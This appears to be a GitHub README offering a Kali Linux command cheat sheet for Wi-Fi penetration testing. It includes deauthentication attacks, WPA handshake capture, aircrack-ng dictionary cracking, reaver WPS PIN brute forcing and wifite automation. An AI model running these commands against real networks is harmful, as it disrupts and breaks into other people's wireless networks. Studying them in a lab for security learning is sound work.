# How-to-hack-Wifi-
A simple wireless penetration testing project for learning how to scan Wi-Fi networks, capture handshakes, and test wireless security using tools like Aircrack-ng and Wifite in a legal lab environment.  

⚠️ For educational and ethical hacking practice only.

# 🛜 Wireless Penetration Testing Commands (Kali Linux)

## 1. Check Wireless Interface

```bash
iwconfig
ip a
ifconfig
```

---

## 2. Enable Monitor Mode

Using aircrack-ng suite:

```bash
airmon-ng check kill
airmon-ng start wlan0
```

Your interface becomes:

```
wlan0 → wlan0mon
```

To stop monitor mode:

```bash
airmon-ng stop wlan0mon
service NetworkManager restart
```

---

## 3. Scan Nearby Wi-Fi Networks

```bash
airodump-ng wlan0mon
```

Target specific band/channel:

```bash
airodump-ng --channel 6 wlan0mon
```

Save scan results:

```bash
airodump-ng -w scan_results wlan0mon
```

---

## 4. Capture Handshake (WPA/WPA2)

```bash
airodump-ng --bssid <AP_MAC> -c <channel> -w capture wlan0mon
```

Deauth attack (to capture handshake):

```bash
aireplay-ng --deauth 10 -a <AP_MAC> -c <client_MAC> wlan0mon
```

---

## 5. Crack WPA/WPA2 Password (Dictionary Attack)

```bash
aircrack-ng -w wordlist.txt -b <AP_MAC> capture.cap
```

Example wordlists:

```bash
/usr/share/wordlists/rockyou.txt
```

---

## 6. WPS Attack Tools

### Check WPS-enabled routers:

```bash
wash -i wlan0mon
```

### Brute force WPS PIN:

```bash
reaver -i wlan0mon -b <AP_MAC> -vv
```

---

## 7. Wifite (Auto Wireless Attack Tool)

```bash
wifite
```

For WPA networks:

```bash
wifite --wpa
```

---

## 8. Bettercap (Advanced MITM + WiFi Attacks)

Start:

```bash
bettercap -iface wlan0mon
```

Inside console:

```bash
wifi.recon on
wifi.show
wifi.deauth <AP_MAC>
```

---

## 9. Get Connected Wi-Fi Details

```bash
nmcli dev wifi
nmcli dev wifi list
```

---

## 10. Network Info & Routing

```bash
route -n
ip route
netstat -nr
```

---

## 11. Kill Interfering Services (Important)

```bash
airmon-ng check kill
```

---

## 12. Restore Network Services

```bash
systemctl restart NetworkManager
```

---

# ⚠️ Important Notes

* WPA/WPA2 cracking requires **handshake capture**
* WPS attack works only if router has WPS enabled
* Monitor mode is mandatory for sniffing
* Most attacks depend on **wordlist strength**

---
